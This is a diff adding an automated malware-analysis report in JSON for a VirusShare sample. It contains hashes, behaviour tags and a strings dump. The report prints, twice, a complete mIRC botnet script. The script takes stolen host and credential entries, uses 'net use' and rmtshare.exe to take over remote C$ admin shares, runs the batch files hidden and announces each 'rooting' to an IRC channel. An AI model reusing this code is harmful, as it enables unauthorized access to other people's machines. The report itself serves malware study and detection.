@@ -1,0 +1,72 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "filecopy": "May copy a file",
+            "run": "May run an executable file or a system command",
+            "write": "May write to a file"
+        },
+        "macro": "[script]\nn0=alias getroot { if ($lines(%store.file) < 3) { halt }\nn1=  set %t.host \\\\ $+ $read(%store.file,1)\nn2=  write -dl1 %store.file  \nn3=  set %t.user $read(%store.file,1)\nn4=  write -dl1 %store.file  \nn5=  set %t.pass $read(%store.file,1) \nn6=  write -dl1 %store.file   \nn7=  if (%t.pass == \"[NULL]\") { null | halt }\nn8=  else { root | halt }  \nn9=}\nn10=alias root {\nn11=  :select  \nn12=  set %tempfile filecopy $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ .bat\nn13=  set %checkfile mapcheck $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ .bat  \nn14=  set %t.drive $rand(l,z) $+ :\nn15=  if ($exists(%t.drive) == $true) { goto select }\nn16=  msg %channel Rooting began on IP: %t.host Username: %t.user Password: %t.pass %cclogo\nn17=  write %checkfile net use %t.host /USER: $+ %t.user %t.pass\nn18=  write %checkfile rmtshare.exe %t.host $+ \\C$=C:\\\nn19=  write %checkfile net use %t.drive %t.host $+ \\C$\nn20=  run hiddenrun.exe %checkfile\nn21=  timercheck 1 60 checker\nn22=}\nn23=alias null {\nn24=  :select  \nn25=  set %tempfile filecopy $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ .bat\nn26=  set %checkfile mapcheck $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ .bat  \nn27=  set %t.drive $rand(l,z) $+ :\nn28=  if ($exists(%t.drive) == $true) { goto select }\nn29=  msg %channel Rooting began on IP: %t.host Username: %t.user Password: Blank Password %cclogo\nn30=  write %checkfile net use %t.host /USER: $+ %t.user \"\"\nn31=  write %checkfile rmtshare.exe %t.host $+ \\C$=C:\\\nn32=  write %checkfile net use %t.drive %t.host $+ \\C$\nn33=  run hiddenrun.exe %checkfile\nn34=  timercheck 1 60 checker\nn35=}"
+    },
+    "filename": "VirusShare_8dc800e489b11e9b701438cb9fc8ce21",
+    "filesize": 1734,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "8dc800e489b11e9b701438cb9fc8ce21",
+        "sha1": "ed69502ec256268a215b43b5f0ce5d39e75f6dc5",
+        "sha256": "fbc76a679c09797f3203e97fa45260efb5b4a5e066441d570a56315f60d3530c"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "[script]",
+            "n0=alias getroot { if ($lines(%store.file) < 3) { halt }",
+            "n1=  set %t.host \\\\ $+ $read(%store.file,1)",
+            "n2=  write -dl1 %store.file  ",
+            "n3=  set %t.user $read(%store.file,1)",
+            "n4=  write -dl1 %store.file  ",
+            "n5=  set %t.pass $read(%store.file,1) ",
+            "n6=  write -dl1 %store.file   ",
+            "n7=  if (%t.pass == \"[NULL]\") { null | halt }",
+            "n8=  else { root | halt }  ",
+            "n9=}",
+            "n10=alias root {",
+            "n11=  :select  ",
+            "n12=  set %tempfile filecopy $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ .bat",
+            "n13=  set %checkfile mapcheck $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ .bat  ",
+            "n14=  set %t.drive $rand(l,z) $+ :",
+            "n15=  if ($exists(%t.drive) == $true) { goto select }",
+            "n16=  msg %channel Rooting began on IP: %t.host Username: %t.user Password: %t.pass %cclogo",
+            "n17=  write %checkfile net use %t.host /USER: $+ %t.user %t.pass",
+            "n18=  write %checkfile rmtshare.exe %t.host $+ \\C$=C:\\",
+            "n19=  write %checkfile net use %t.drive %t.host $+ \\C$",
+            "n20=  run hiddenrun.exe %checkfile",
+            "n21=  timercheck 1 60 checker",
+            "n22=}",
+            "n23=alias null {",
+            "n24=  :select  ",
+            "n25=  set %tempfile filecopy $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ .bat",
+            "n26=  set %checkfile mapcheck $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ .bat  ",
+            "n27=  set %t.drive $rand(l,z) $+ :",
+            "n28=  if ($exists(%t.drive) == $true) { goto select }",
+            "n29=  msg %channel Rooting began on IP: %t.host Username: %t.user Password: Blank Password %cclogo",
+            "n30=  write %checkfile net use %t.host /USER: $+ %t.user \"\"",
+            "n31=  write %checkfile rmtshare.exe %t.host $+ \\C$=C:\\",
+            "n32=  write %checkfile net use %t.drive %t.host $+ \\C$",
+            "n33=  run hiddenrun.exe %checkfile",
+            "n34=  timercheck 1 60 checker",
+            "n35=}"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.308129",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
